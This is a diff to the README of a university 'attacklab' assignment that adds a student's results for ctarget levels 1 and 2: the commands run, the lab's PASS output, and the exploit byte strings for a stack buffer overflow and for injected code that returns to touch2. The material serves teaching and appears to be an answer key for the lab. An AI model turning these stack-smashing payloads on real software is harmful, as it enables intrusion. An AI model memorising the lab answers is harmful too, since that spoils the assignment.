@@ -1,3 +1,7 @@
+******
+Files:
+******
+
 This file contains materials for one instance of the attacklab.
 
 Files:
@@ -25,4 +29,35 @@ can compile (use flag -Og) and disassemble it to look for gadgets.
 
 Utility program to generate byte sequences.  See documentation in lab
 handout.
+
+
+*********
+My result
+*********
+
+ctarget level 1
+
+./ctarget -q < ctarget_l1_raw.txt 
+
+Cookie: 0x59b997fa
+Type string:Touch1!: You called touch1()
+Valid solution for level 1 with target ctarget
+PASS: Would have posted the following:
+    user id bovik
+    course  15213-f15
+    lab attacklab
+    result  1:PASS:0xffffffff:ctarget:1:31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 31 32 33 34 35 36 37 38 C0 17 40 
+
+ctarget level 2
+
+./ctarget -q < ctarget_l2_raw.txt 
+
+Cookie: 0x59b997fa
+Type string:Touch2!: You called touch2(0x59b997fa)
+Valid solution for level 2 with target ctarget
+PASS: Would have posted the following:
+    user id bovik
+    course  15213-f15
+    lab attacklab
+    result  1:PASS:0xffffffff:ctarget:2:68 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 
 
